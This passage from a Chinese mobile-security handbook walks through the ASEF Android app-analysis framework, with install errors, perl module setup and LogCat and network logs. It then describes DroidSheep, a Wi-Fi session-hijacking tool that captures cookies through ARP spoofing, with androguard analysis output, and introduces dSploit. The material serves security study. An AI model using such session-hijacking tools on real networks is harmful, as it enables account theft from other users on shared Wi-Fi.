break-word;'>com.example.qappinfo.NightPhoenix.a...</td><td style='text-align: center; word-wrap: break-word;'>2014/11/25 12:47</td><td style='text-align: center; word-wrap: break-word;'>Android 程序安...</td><td style='text-align: center; word-wrap: break-word;'>18KB</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>jarlist.cache</td><td style='text-align: center; word-wrap: break-word;'>2014/11/25 12:47</td><td style='text-align: center; word-wrap: break-word;'>CACHE 文件</td><td style='text-align: center; word-wrap: break-word;'>1KB</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>NIGHTPHOENIX.apk</td><td style='text-align: center; word-wrap: break-word;'>2014/11/25 12:47</td><td style='text-align: center; word-wrap: break-word;'>Android 程序安...</td><td style='text-align: center; word-wrap: break-word;'>17KB</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Qappinfo.apk</td><td style='text-align: center; word-wrap: break-word;'>2014/11/25 12:47</td><td style='text-align: center; word-wrap: break-word;'>Android 程序安...</td><td style='text-align: center; word-wrap: break-word;'>16KB</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>QappinfoActivity.apk</td><td style='text-align: center; word-wrap: break-word;'>2014/11/25 12:47</td><td style='text-align: center; word-wrap: break-word;'>Android 程序安...</td><td style='text-align: center; word-wrap: break-word;'>17KB</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>QappinfoActivity_ASEF.apk</td><td style='text-align: center; word-wrap: break-word;'>2014/11/25 12:47</td><td style='text-align: center; word-wrap: break-word;'>Android 程序安...</td><td style='text-align: center; word-wrap: break-word;'>17KB</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>resources.ap_</td><td style='text-align: center; word-wrap: break-word;'>2014/11/25 13:02</td><td style='text-align: center; word-wrap: break-word;'>AP_文件</td><td style='text-align: center; word-wrap: break-word;'>11KB</td></tr></table>

C:\>adb install Qappinfo.apk

1226 KB/s (15698 bytes in 0.012s)

pkg: /data/local/tmp/Qappinfo.apk

Failure [INSTALL_FAILED_OLDER_SDK]

因此，我们需要亲自编译并安装到设备。运行Eclipse后选择File > Import菜单，并选择Android > Existing Android Code Into Workspace文件夹（选择现有文件夹）。

General

Android

Existing Android Code Into Workspace

D C/C++

> Git

Install

Run/Debug

图6-18 在Eclipse中导入现有项目

在Import Projects中选择解压到根目录的NightPhoeix_ASEF文件夹即可，如图6-19所示。扩展名为.project，可以看出是Eclipse项目文件。

##### Import Projects

Select a directory to search for existing Android projects

Deselect All

Refresh

图6-19 设置导入项目的根目录

浏览图6-20左侧的项目结构时，如果正常导入，则不会有错误提示。

 </div>

选择项目后，点击编译安装（Run）就能正常安装程序。因为在安装的同时会运行App并开始进行诊断，所以只需查看日志画面。

 </div>

诊断时，查看LogCat信息即可看到诊断对象的文件信息。

#### Java源代码文件

Log.i(TAG, "PckgName: " + pInfo.packageName + " Version:" + pInfo.versionName + " Version code:" + pInfo.versionCode + (pInfo.permissions == null)
" :pInfo.permissions[0].name) ;
sb.append("\\n" + count + ")" + " Package Name : " + pInfo.packageName + "\\nVersion : " + pInfo.versionName + "\\nVersion code : " + pInfo.versionCode + (pInfo.permissions == null) ;

#### 显示信息：LogCat

11-08 08:18:28.531: I/ActivityManager(89): START {act=android.intent.action.MAIN cat=[android.intent.category.LAUNCHER] flg=0x10200000 cmp=com.example.qappinfo/.NightPhoenix} from pid 204
11-08 08:18:28.531: W/WindowManager(89): Failure taking screenshot for (180x300) to layer 21005

11-08 08:18:28.591: W/NetworkManagementSocketTagger(89): setKernelCountSet(10040, 1) failed with erro -2
11-08 08:18:29.902: I/NightPhoenix(543): PckgName: android Version:4.0.3-237985
Version code:15
11-08 08:18:29.902: I/NightPhoenix(543): APK PATH := /system/framework/framework-res.apk
11-08 08:18:29.902: I/NightPhoenix(543): PckgName: com.activator Version:1.0
Version code:1
11-08 08:18:29.911: I/NightPhoenix(543): APK PATH := /data/app/com.activator-1.apk
11-08 08:18:30.011: I/NightPhoenix(543): PckgName: com.android.backupconfirm
Version:4.0.3-237985 Version code:15
11-08 08:18:30.011: I/NightPhoenix(543): APK PATH := /system/app/BackupRestoreConfirmation.apk
11-08 08:18:30.011: I/NightPhoenix(543): PckgName: com.android.browser
Version:4.0.3-237985 Version code:15
11-08 08:18:30.021: I/NightPhoenix(543): APK PATH := /system/app/Browser.apk
11-08 08:18:30.021: I/NightPhoenix(543): PckgName: com.android.calculator2
Version:4.0.3-237985 Version code:15
11-08 08:18:30.032: I/NightPhoenix(543): APK PATH := /system/app/Calculator.apk
11-08 08:18:30.032: I/NightPhoenix(543): PckgName: com.android.calendar
Version:4.0.3-237985 Version code:15
11-08 08:18:30.041: I/NightPhoenix(543): APK PATH := /system/app/Calendar.apk
11-08 08:18:30.041: I/NightPhoenix(543): PckgName: com.android.camera Version:1
Version code:1
11-08 08:18:30.051: I/NightPhoenix(543): APK PATH := /system/app/Camera.apk
...(省略)...

#### 6.3.2 检测设备apk文件

解压文件后可以看到apkeval.pl文件，此款工具可以对连接到PC的移动设备或虚拟设备中的apk文件自动执行动态分析。

开发人员在MACOS X环境中进行了优化, 所以想要在其他系统下运行, 就需要做相应修改。第一次运行时会根据perl环境提示如下错误信息, 这是因为没有安装此程序需要的库。可以在perl环境下使用cpan命令（cpan URI:Find）快速添加相关库。出现其他库文件错误时也可以使用相同命令解决。

pppd210-114-61-26: ASEF_OSP root# ./apkeval.pl
Can't locate URI/Find.pm in @INC (@INC contains:
/Library/Perl/5.12/darwin-thread-multi-2level /Library/Perl/5.12
/Network/Library/Perl/5.12/darwin-thread-multi-2level
/Network/Library/Perl/5.12 /Library/Perl/Updates/5.12.3
/System/Library/Perl/5.12/darwin-thread-multi-2level
/System/Library/Perl/5.12
/System/Library/Perl/Extras/5.12/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.12 .) at ./apkeval.pl line 6.
BEGIN failed--compilation aborted at ./apkeval.pl line 6.

使用cpan安装模块时需要注意大小写，否则会出现错误，而且很难找出原因。

pppd210-114-61-26: ASEF_OSP root# cpan URI: Find
Set up gcc environment - 3.4.5 (mingw-vista special r3)
CPAN: Term::ANSIColor loaded ok (v4.02)
CPAN: Storable loaded ok (v2.34)
Database was generated on Mon, 10 Jun 2013 10:07:37 GMT
Running install for module 'URI::Find'
Running make for M/MS/MSCHWERN/URI-Find-20111103.tar.gz
CPAN: LWP::UserAgent loaded ok (v6.04)
CPAN: Time::HiRes loaded ok (v1.9725)
Fetching with LWP:
http://ppm.activestate.com/CPAN/authors/id/M/MS/MSCHWERN/URI-Find-20111103.tar.gz
CPAN: YAML::XS loaded ok (v0.39)
CPAN: Digest::SHA loaded ok (v5.84)
Fetching with LWP:
http://ppm.activestate.com/CPAN/authors/id/M/MS/MSCHWERN/CHECKSUMS
CPAN: Compress::Zlib loaded ok (v2.06)
Checksum for
C:\Perl\cpan\sources\authors\id\MS\MSCHWERN\URI-Find-20111103.tar.gz
CPAN: Archive::Tar loaded ok (v1.90)
URI-Find-20111103
URI-Find-20111103/Build.PL
URI-Find-20111103/Changes
URI-Find-20111103/INSTALL
URI-Find-20111103/MANIFEST
URI-Find-20111103/MANIFEST.SKIP
URI-Find-20111103/META.json
URI-Find-20111103/META.yml
URI-Find-20111103/README
URI-Find-20111103/SIGNATURE
URI-Find-20111103/TODO
URI-Find-20111103/bin
URI-Find-20111103/bin/urifind
...(省略)...
pppd210-114-61-26: ASEF_OSP root# cpan URI:Encode
Set up gcc environment - 3.4.5 (mingw-vista special r3)
CPAN: Term::ANSIColor loaded ok (v4.02)
CPAN: Storable loaded ok (v2.34)
Database was generated on Mon, 10 Jun 2013 10:07:37 GMT
Running install for module 'URI::Encode'
Running make for M/MI/MITHUN/URI-Encode-0.09.tar.gz
CPAN: LWP::UserAgent loaded ok (v6.04)
CPAN: Time::HiRes loaded ok (v1.9725)
Fetching with LWP:
http://ppm.activestate.com/CPAN/authors/id/M/MI/MITHUN/URI-Encode-0.09.tar.gz
CPAN: YAML::XS loaded ok (v0.39)
CPAN: Digest::SHA loaded ok (v5.84)
Fetching with LWP:
http://ppm.activestate.com/CPAN/authors/id/M/MI/MITHUN/CHECKSUMS
CPAN: Compress::Zlib loaded ok (v2.06)
Checksum for C:\Perl\cpan\sources\authors\id\MS\MIS\MITHUN\URI-Encode-0.09.tar.gz
CPAN: Archive::Tar loaded ok (v1.90)
URI-Encode-0.09
URI-Encode-0.09/Build.PL
...(省略)...

运行相关工具前，先运行Android虚拟设备，如图6-22所示。诊断真实设备中的App时，也会先安装到虚拟设备后再测试，所以这个过程是必须的。

 </div>

运行工具后会自动对App重复“安装 > 诊断 > 删除”过程。通过这种过程可以分析设备中所有App的漏洞（恶意代码分析）。默认设置分析5个程序。

 </div>

也可以在源代码中把APKCNT修改为100个进行分析，但数字太大会出现中断现象。

#### apkeval.pl - 第268行

foreach (@ARRPKGLIST)
{
    if ($APKCNT == 5) { last; } # if you have 50+ applications installed, you can just use this counter to only do it for 5 if you are only interested in it'd demo...
    $_ =~ s/package\://g;

apkeval诊断工具的主要选项如表6-1所示。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>主要选项</td><td style='text-align: center; word-wrap: break-word;'>说明</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>-h</td><td style='text-align: center; word-wrap: break-word;'>查看帮助文档</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>-a</td><td style='text-align: center; word-wrap: break-word;'>诊断对象文件名</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>-p</td><td style='text-align: center; word-wrap: break-word;'>需诊断的App文件夹（诊断多个文件）</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>-d</td><td style='text-align: center; word-wrap: break-word;'>执行ASEF后可以联动的设备名称</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>-s</td><td style='text-align: center; word-wrap: break-word;'>设置文件（Configurations.txt）中设置的文件名</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>-e</td><td style='text-align: center; word-wrap: break-word;'>可以查看内核日志、内存转储信息、各阶段进程信息的扩展模式</td></tr></table>

如下设置并运行设备即可开始诊断。环境不同，网络连接信息可能会失败。

08-20 15:38:34.821 D/AndroidRuntime( 1007):
08-20 15:38:34.821 D/AndroidRuntime( 1007): >>>>> AndroidRuntime START
com.android.internal.os.RuntimeInit <<<<<<
08-20 15:38:34.821 D/AndroidRuntime( 1007): CheckJNI is ON
08-20 15:38:35.461 D/AndroidRuntime( 1007): Calling main entry
com.android.commands.am.Am
08-20 15:38:35.491 D/AndroidRuntime( 1007): Shutting down VM
08-20 15:38:35.511 D/dalvikvm( 1007): GC_CONCURRENT freed 101K, 69% free 318K/1024K,
external OK/OK, paused 1ms+2ms
08-20 15:38:35.511 D/jdwp ( 1007): adbd disconnected
08-20 15:38:35.531 I/AndroidRuntime( 1007): NOTE: attach of thread 'Binder Thread #3' failed
08-20 15:38:41.141 D/AndroidRuntime( 1017):
08-20 15:38:41.141 D/AndroidRuntime( 1017): >>>> AndroidRuntime START
com.android.internal.os.RuntimeInit <<<<<<
08-20 15:38:41.141 D/AndroidRuntime( 1017): CheckJNI is ON
08-20 15:38:41.781 D/AndroidRuntime( 1017): Calling main entry
com.android.commands.monkey.Monkey
08-20 15:39:07.991 D/AndroidRuntime( 1029):
08-20 15:39:07.991 D/AndroidRuntime( 1029): >>>> AndroidRuntime START
com.android.internal.os.RuntimeInit <<<<<<
08-20 15:39:07.991 D/AndroidRuntime( 1029): CheckJNI is ON
08-20 15:39:08.641 D/AndroidRuntime( 1029): Calling main entry
com.android.commands.am.Am
08-20 15:39:08.671 D/AndroidRuntime( 1029): Shutting down VM
08-20 15:39:08.691 D/dalvikvm( 1029): GC_CONCURRENT freed 101K, 69% free 318K/1024K,
external OK/OK, paused 1ms+1ms
08-20 15:39:08.691 D/jdwp ( 1029): adbd disconnected
08-20 15:39:08.731 I/dalvikvm( 1029): JNI: AttachCurrentThread (from ????.)
08-20 15:39:08.731 I/AndroidRuntime( 1029): NOTE: attach of thread 'Binder Thread #3' failed
08-20 15:41:04.931 D/SntpClient( 61): request time failed:
java.net.SocketException: Address family not supported by protocol
08-20 15:46:04.941 D/SntpClient( 61): request time failed:
java.net.SocketException: Address family not supported by protocol

 </div>

图6-24表示诊断App时导出的日志和网络连接日志。这是App自动执行和结束时产生的日志，可以快速收集各App的网络连接信息。不仅可以应用于App服务诊断，收集恶意代码的网络连接信息时也很有用。

App诊断日志示例

08-20 15:38:41.141 D/AndroidRuntime(1017):

08-20 15:38:41.141 D/AndroidRuntime( 1017): >>>> AndroidRuntime START

com.android.internal.os.RuntimeInit <<<<

08-20 15:38:41.141 D/AndroidRuntime( 1017): CheckJNI is ON

08-20 15:38:41.781 D/AndroidRuntime(1017): Calling main entry

com.android.commands.monkey.Monkey

08-20 15:39:07.991 D/AndroidRuntime ( 1029):

08-20 15:39:07.991 D/AndroidRuntime( 1029): >>>> AndroidRuntime START

com.android.internal.os.RuntimeInit <<<<

08-20 15:39:07.991 D/AndroidRuntime( 1029): CheckJNI is ON

08-20 15:39:08.641 D/AndroidRuntime( 1029): Calling main entry

com.android.commands.am.Am

08-20 15:39:08.671 D/AndroidRuntime( 1029): Shutting down VM

08-20 15:39:08.691 D/dalvikvm(1029): GC_CONCURRENT freed 101K, 69% free

318K/1024K, external 0K/0K, paused 1ms+1ms

08-20 15:39:08.691 D/jdwp (1029): adbd disconnected

08-20 15:39:08.731 I/dalvikvm( 1029):JNI:AttachCurrentThread (from ????.)

08-20 15:39:08.731 I/AndroidRuntime( 1029): NOTE: attach of thread 'Binder

Thread #3' failed

08-20 15:41:04.931 D/SntpClient( 61): request time failed:

java.net.SocketException: Address family not supported by protocol

08-20 15:46:04.941 D/SntpClient( 61): request time failed:

java.net.SocketException: Address family not supported by protocol

08-20 15:46:26.412 I/dalvikvm( 295): Total arena pages for JIT: 11

08-20 15:46:26.412 I/dalvikvm( 295): Total arena pages for JIT: 12

08-20 15:47:05.305 D/dalvikvm( 295): GC_EXPLICIT freed 160K, 52% free

2634K/5447K, external 1625K/2137K, paused 230ms

08-20 15:51:04.951 D/SntpClient( 61): request time failed:

java.net.SocketException: Address family not supported by protocol

08-20 15:56:04.962 D/SntpClient( 61): request time failed:

java.net.SocketException: Address family not supported by protocol

08-20 16:01:05.051 D/SntpClient( 61): request time failed:

08-20 16:06:05.061 D/SntpClient( 61): request time failed:

java.net.SocketException: Address family not supported by protocol

08-20 16:11:05.072 D/SntpClient( 61): request time failed:

java.net.SocketException: Address family not supported by protocol

08-20 16:16:05.081 D/SntpClient( 61): request time failed:

java.net.SocketException: Address family not supported by protocol

08-20 16:16:58.647 D/PerformBackupThread(61): starting agent for backup of

BackupRequest {app=ApplicationInfo{405b8c38

 $ \cdots $ (省略)  $ \cdots $

##### 网络连接信息日志示例

15:38:37.822803 IP pppd210-114-61-26.hitel.net.62719 >

211.45.150.101.domain: 7221+ AAAA? koreajoongangdaily.joinsmsn.com. (49)

15:38:37.822928 IP pppd210-114-61-26.hitel.net.55957 >

211.45.150.101.domain: 33390+ AAAA? www.dailian.co.kr. (35)

15:38:37.824118 IP 211.45.150.101.domain >

pppd210-114-61-26.hitel.net.62719: 7221 0/1/0 (103)

15:38:37.824322 IP 211.45.150.101.domain >

pppd210-114-61-26.hitel.net.62719: 7221 0/1/0 (103)

15:38:37.824483 IP 211.45.150.101.domain >

pppd210-114-61-26.hitel.net.55957: 33390 0/1/0 (88)

15:38:37.824504 IP pppd210-114-61-26.hitel.net > 211.45.150.101: ICMP

pppd210-114-61-26.hitel.net udp port 55957 unreachable, length 36

15:38:37.824843 IP 211.45.150.101.domain >

pppd210-114-61-26.hitel.net.55957: 33390 0/1/0 (88)

15:38:37.824859 IP pppd210-114-61-26.hitel.net > 211.45.150.101: ICMP

pppd210-114-61-26.hitel.net udp port 55957 unreachable, length 36

15:38:37.825602 IP pppd210-114-61-26.hitel.net.49762 >

211.45.150.101.domain: 21168+ A? www.donga.com. (31)

15:38:37.825696 IP pppd210-114-61-26.hitel.net.62197 >

211.45.150.101.domain: 57907+ AAAA? www.donga.com. (31)

15:38:37.825863 IP pppd210-114-61-26.hitel.net.49762 >

211.45.150.101.domain: 21168+ A? www.donga.com. (31)

15:38:37.827024 IP 211.45.150.101.domain >

pppd210-114-61-26.hitel.net.49762: 21168 1/3/2 A 210.115.150.1 (153)

15:38:37.827052 IP pppd210-114-61-26.hitel.net > 211.45.150.101: ICMP

pppd210-114-61-26.hitel.net udp port 49762 unreachable, length 36

15:38:37.827137 IP 211.45.150.101.domain >

pppd210-114-61-26.hitel.net.49762: 21168 1/3/2 A 210.115.150.1 (153)

15:38:37.827153 IP pppd210-114-61-26.hitel.net > 211.45.150.101: ICMP

pppd210-114-61-26.hitel.net udp port 49762 unreachable, length 36

15:38:37.827656 IP 211.45.150.101.domain >

pppd210-114-61-26.hitel.net.62197: 57907 0/1/0 (99)

15:38:37.827684 IP pppd210-114-61-26.hitel.net > 211.45.150.101: ICMP

pppd210-114-61-26.hitel.net udp port 62197 unreachable, length 36

15:38:37.827794 IP 211.45.150.101.domain >

pppd210-114-61-26.hitel.net.49762: 21168 1/3/2 A 210.115.150.1 (153)

15:38:37.827858 IP pppd210-114-61-26.hitel.net > 211.45.150.101: ICMP

pppd210-114-61-26.hitel.net udp port 49762 unreachable, length 36

15:38:37.828272 IP 211.45.150.101.domain >

pppd210-114-61-26.hitel.net.62197: 57907 0/1/0 (99)

15:38:37.828285 IP pppd210-114-61-26.hitel.net > 211.45.150.101: ICMP

pppd210-114-61-26.hitel.net udp port 62197 unreachable, length 36

15:38:37.828704 IP 211.45.150.101.domain >

pppd210-114-61-26.hitel.net.49762: 21168 1/3/2 A 210.115.150.1 (153)

15:38:37.828768 IP pppd210-114-61-26.hitel.net > 211.45.150.101: ICMP

pppd210-114-61-26.hitel.net udp port 49762 unreachable, length 36

15:38:38.157275 IP pppd210-114-61-26.hitel.net.55259 >

211.45.150.101.domain: 39223+ A? koreajoongangdaily.joinsmsn.com. (49)

15:38:38.163718 IP 211.45.150.101.domain >

pppd210-114-61-26.hitel.net.55259: 39223 1/2/0 A 211.218.152.136 (101)

15:38:38.163832 IP 211.45.150.101.domain >

pppd210-114-61-26.hitel.net.55259: 39223 1/2/0 A 211.218.152.136 (101)

15:38:41.300835 ARP, Request who-has pppd210-114-63-254.hitel.net tell

pppd210-114-61-26.hitel.net, length 28

15:38:41.301884 ARP, Reply pppd210-114-63-254.hitel.net is-at

00:00:0c:07:ac:3f (oui Cisco), length 46

15:38:41.301903 IP pppd210-114-61-26.hitel.net.ntp >

tok-ntp-ext.asia.apple.com.ntp: NTPv4, Client, length 48

要想获取ASEF源代码中使用的Google Safe Browsing功能的个人API密钥, 可以登录谷歌公司网站, 访问如下网址即可查看API密钥。

在https://developers.google.com/safe-browsing/点击Sing up for an API Key后，点击生成密钥（Generate API Key）即可，如图6-25所示。

 </div>

### 6.4 DroidSheep: Web 会话截取工具

DroidSheep是Web会话截取工具，此款工具会连接到无线网络，对连接在同一无线网络的移动设备进行数据包收集工作。还可以监控没有使用SSL通信的HTTP网页，并把结果显示到移动设备。

软件安装到Android设备时会要求超级用户权限，并提示所有法律责任均由用户承担，同意此项协议即可运行程序。

 </div>

程序运行后会实时收集信息，点击相关信息可以监控用户浏览器、获取用户Cookie信息、使用E-Mail发送相关信息等。

 </div>

演示视频URL如下。

http://www.youtube.com/watch?v=z7NUluxUORs&feature=player_embedded

下面看看将此工具用作恶意代码时会找出何种威胁。探测到可以恶意使用的WAKE_LOCK、WRITE_GMAIL、INTERNET相关API。

root@honeynet:/home/android/tools/androguard-1.6# ./androapkinfo.py -i
DroidSheep_public.apk
DroidSheep_public.apk :
FILES:
res/layout/debug.xml Android's binary XML 756a864e
res/layout/disclaimer.xml Android's binary XML 7564c0a9
res/layout/donation.xml Android's binary XML 14f5878d
res/layout/listelement.xml Android's binary XML -54ae0a27
res/layout/listen.xml Android's binary XML 21ccd4b9
res/layout/unrooted.xml Android's binary XML 7d3fe503
res/layout/webview.xml Android's binary XML 52c194b6
res/raw/arpspoof ELF 32-bit LSB executable, ARM, version 1 (SYSV) -347c45e9
res/raw/droidsheep ELF 32-bit LSB executable, ARM, version 1 (SYSV) -5e2b9309
res/raw/droidsheep_bak ELF 32-bit LSB executable, ARM, version 1 (SYSV) 5b73e2ac
res/xml/auth.xml Android's binary XML -33fcdcc4
AndroidManifest.xml Android's binary XML -4ac3c311
resources.arsc data 409bb572
res/drawable-hdpi/amazon.png PNG image, 64 x 64, 8-bit/color RGBA, non-interlaced
-7a8d02a9
res/drawable-hdpi/droidsheep_square.png PNG image, 300 x 300, 8-bit/color RGBA,

non-interlaced 33091699

res/drawable-hdpi/droidsheep_square_red.png PNG image, 300 x 300, 8-bit/color RGBA, non-interlaced -5465377e

res/drawable-hdpi/ebay.png PNG image, 64 x 64, 8-bit/color RGBA, non-interlaced 40ef1cc4

res/drawable-hdpi/facebook.png PNG image, 64 x 64, 8-bit/color RGBA,

res/drawable-hdpi/flickr.png PNG image, 64 x 64, 8-bit/color RGBA, non-interlaced 3379759d

res/drawable-hdpi/google.png PNG image, 64 x 64, 8-bit/color RGBA, non-interlaced 6878e938

res/drawable-hdpi/linkedin.png PNG image, 64 x 64, 8-bit/color RGBA,

res/drawable-hdpi/twitter.png PNG image, 64 x 64, 8-bit/color RGBA,

res/drawable-hdpi/youtube.png PNG image, 64 x 64, 8-bit/color RGBA, non-interlaced -9c2c7db

classes.dex Dalvik dex file version 035 746cd1b6

META-INF/MANIFEST.MF ASCII text, with CRLF line terminators -c6bcfca

META-INF/CERT.SF ASCII text, with CRLF line terminators 14ace0d9

META-INF/CERT.RSA data 45fcec89

PERMISSIONS:

android.permission.WAKE_LOCK ['dangerous', 'prevent phone from sleeping',

'Allows an application to prevent the phone from going to sleep.']

com.google.android.gm.permission.WRITE_GMAIL ['dangerous', 'Unknown permission

from android reference', 'Unknown permission from android reference']

android.permission.ACCESS_WIFI_STATE ['normal', 'view Wi-Fi status', 'Allows an

application to view the information about the status of Wi-Fi.]

android.permission.INTERNET ['dangerous', 'full Internet access', 'Allows an application to create network sockets.']

MAIN ACTIVITY: de.trier.infsec.koch.droidsheep.activities.ListenActivity

ACTIVITIES: ['de.trier.infsec.koch.droidsheep.activities.ListenActivity',

'de.trier.infsec.koch.droidsheep.activities.HijackActivity',

'de.trier.infsec.koch.droidsheep.activities.DonateActivity',

'de.trier.infsec.koch.droidsheep.activities.UpdateActivity']

SERVICES: ['de.trier.infsec.koch.droidsheep.services.ArpspoofService',

'de.trier.infsec.koch.droidsheep.services.DroidSheepService']

RECEIVERS: [ ]

PROVIDERS: [ ]

Native code: False

Dynamic code: False

Reflection code: False

Lde/trier/infsec/koch/droidsheep/activities/DonateActivity; <init> ['ANDROID', 'APP']

Lde/trier/infsec/koch/droidsheep/activities/DonateActivity; onClick ['ANDROID', 'NET', 'CONTENT']

Lde/trier/infsec/koch/droidsheep/activities/DonateActivity; onCreate ['ANDROID', 'APP']

Lde/trier/infsec/koch/droidsheep/activities/DonateActivity; onStart ['ANDROID', 'WIDGET', 'APP']

Lde/trier/infsec/koch/droidsheep/activities/HijackActivity$1; <init> ['ANDROID', 'WEBKIT']

Lde/trier/infsec/koch/droidsheep/activities/HijackActivity$2; onClick ['ANDROID', 'WEBKIT', 'WIDGET', 'TEXT']

<init> ['ANDROID', 'WEBKIT']
Lde/trier/infsec/koch/droidsheep/activities/HijackActivity$MyWebViewClient;
shouldOverrideUrlLoading ['ANDROID', 'WEBKIT']
Lde/trier/infsec/koch/droidsheep/activities/HijackActivity; <init> ['ANDROID', 'APP']
Lde/trier/infsec/koch/droidsheep/activities/HijackActivity; selectURL ['ANDROID', 'WEBKIT', 'WIDGET', 'APP']
Lde/trier/infsec/koch/droidsheep/activities/HijackActivity; setupCookies
['ANDROID', 'WEBKIT', 'UTIL']
Lde/trier/infsec/koch/droidsheep/activities/HijackActivity; setupWebView
['ANDROID', 'WEBKIT']
Lde/trier/infsec/koch/droidsheep/activities/HijackActivity; showDonate ['ANDROID', 'CONTENT']
Lde/trier/infsec/koch/droidsheep/activities/HijackActivity; onCreate ['ANDROID', 'WEBKIT', 'APP', 'VIEW']
...（中略）...
Lde/trier/infsec/koch/droidsheep/objects/SessionListView; <init> ['ANDROID', 'WIDGET']
Lde/trier/infsec/koch/droidsheep/objects/SessionListView; <init> ['ANDROID', 'WIDGET']
Lde/trier/infsec/koch/droidsheep/objects/WifiChangeChecker; <init> ['ANDROID', 'CONTENT']
Lde/trier/infsec/koch/droidsheep/objects/WifiChangeChecker; onReceive ['ANDROID', 'OS']
Lde/trier/infsec/koch/droidsheep/services/ArpspoofService; <init> ['ANDROID', 'APP']
Lde/trier/infsec/koch/droidsheep/services/DroidSheepService; <init> ['ANDROID', 'APP']
Lde/trier/infsec/koch/droidsheep/services/DroidSheepService; onHandleIntent
['ANDROID', 'NET', 'UTIL', 'OS', 'CONTENT']
Lde/trier/infsec/koch/droidsheep/services/DroidSheepService; <init> ['ANDROID', 'APP']
Lde/trier/infsec/koch/droidsheep/services/DroidSheepService; onHandleIntent
['ANDROID', 'NET', 'OS', 'UTIL']

root@honeynet:/home/android/tools/androguard-1.6# ./androlyze.py -i DroidSheep_public.apk -x

##### PERM : ACCESS_WIFI_STATE

1 Lde/trier/infsec/koch/droidsheep/activities/ListenActivity;-> startSpoofing()V (0x2a) ----> Landroid/net/wifi/WifiManager;-> getDhcpInfo()Landroid/net/DhcpInfo;

1 Lde/trier/infsec/koch/droidsheep/activities/ListenActivity;-> startSpoofing()V (0x6a) ----> Landroid/net/wifi/WifiManager;-> getDhcpInfo()Landroid/net/DhcpInfo;

1 Lde/trier/infsec/koch/droidsheep/activities/ListenActivity;->

updateNetworkSettings()V (0x1e) ---> Landroid/net/wifi/WifiManager;->

getConnectionInfo()Landroid/net/wifi/WifiInfo;

##### PERM : INTERNET

1 Lde/trier/infsec/koch/droidsheep/auth/AuthDefinition;->

getIdFromWebservice(Ljava/util/List;)Ljava/lang/String; (0x10) --->
Lorg/apache/http/impl/client/DefaultHttpClient;--><init>()V
1 Lde/trier/infsec/koch/droidsheep/auth/AuthDefinition;->
getIdFromWebservice(Ljava/util/List;)Ljava/lang/String; (0x5e) --->
Lorg/apache/http/impl/client/DefaultHttpClient;-->execute(Lorg/apache/http/client/methods/HttpUriRequest;
Lorg/apache/http/client/ResponseHandler;)Ljava/lang/String; (0x5e) --->
Lde/trier/infsec/koch/droidsheep/helper/DialogHelper;->
getContentFromWeb(Ljava/lang/String;)Ljava/lang/String; (0x4) --->
Lorg/apache/http/impl/client/DefaultHttpClient;--><init>()V
1 Lde/trier/infsec/koch/droidsheep/helper/DialogHelper;->
getContentFromWeb(Ljava/lang/String;)Ljava/lang/String; (0x1e) --->
Lorg/apache/http/impl/client/DefaultHttpClient;-->execute(Lorg/apache/http/client/methods/HttpUriRequest;
Lorg/apache/http/client/ResponseHandler;)Ljava/lang/Object;
PERM: WAKE_LOCK
1 Lde/trier/infsec/koch/droidsheep/services/ArpspoofService;->
onHandleIntent(Android/content/Intent;)V (0x12c) --->
Android/net/wifi/WifiManager$WifiLock;-->acquire()V
1 Lde/trier/infsec/koch/droidsheep/services/ArpspoofService;->
onHandleIntent(Android/content/Intent;)V (0x18c) --->
Android/net/wifi/WifiManager$WifiLock;-->release()V
1 Lde/trier/infsec/koch/droidsheep/services/ArpspoofService;->
onHandleIntent(Android/content/Intent;)V (0x1e6) --->
Android/net/wifi/WifiManager$WifiLock;-->release()V
1 Lde/trier/infsec/koch/droidsheep/services/ArpspoofService;->
onHandleIntent(Android/content/Intent;)V (0x240) --->
Android/net/wifi/WifiManager$WifiLock;-->release()V
1 Lde/trier/infsec/koch/droidsheep/services/ArpspoofService;->
onHandleIntent(Android/content/Intent;)V (0x28a) --->
Android/net/wifi/WifiManager$WifiLock;-->release()V
...（省略）...

可以使用androrisk查看按项目分类API函数后的判断结果，包含了3个可以获取执行权限的EXCUTABLE相关API和2个DANGEROUS相关API。

root@honeynet:/home/android/tools/androguard-1.6# ./androrisk.py -i
DroidSheep_public.apk
DroidSheep_public.apk
RedFlags
DEX { 'NATIVE': 0, 'DYNAMIC': 0, 'CRYPTO': 0, 'REFLECTION': 0}
APK { 'DEX': 0, 'EXECUTABLE': 3, 'ZIP': 0, 'SHELL_SCRIPT': 0, 'APK': 0, 'SHARED_LIBRARIES': 0}
PERM { 'PRIVACY': 0, 'NORMAL': 1, 'MONEY': 0, 'INTERNET': 1, 'SMS': 0, 'DANGEROUS': 2, 'SIGNATUREORSYSTEM': 0, 'CALL': 0, 'SIGNATURE': 0, 'GPS': 0}
FuzzyRisk
VALUE 51.1111111111
Anubis诊断结果
https://anubis.iseclab.org/?action=result&task_id=13227cdf75df17b64450d52c978b21c9b
VirusTotal诊断结果
https://www.virustotal.com/file/4f6bf46228a819f7a28b1304cf20bf2bc661ce3a23a7d759fa19eb5c

cc29ae4/analysis/

 </div>

可参考如下URL。

http://droidsheep.de/

☐ https://code.google.com/p/droidsheep/

也有可以防止嗅探的App。为了不被DroidSheep、Faceniff等网络嗅探工具嗅探到数据包，可以安装DroidSheep Guard $ ^{①} $。可以从Google Play Store下载安装。

 </div>

安装完成后点击Start Protection即可查看是否正在进行网络嗅探。如果是，Wi-Fi功能将自动关闭。通过这种快速应对可以防止窃取重要账号信息，但此类警告发生时，需要用户亲自关闭浏览器进程以破坏会话信息。

 </div>

### 6.5 dSploit: 网络诊断工具

dSploit是Android平台下的网络漏洞诊断工具，用于在移动设备上诊断网络漏洞。dSploit提供如下功能。与其他移动平台下的漏洞诊断程序相比，dSploit的性能强大得多。

 </div>

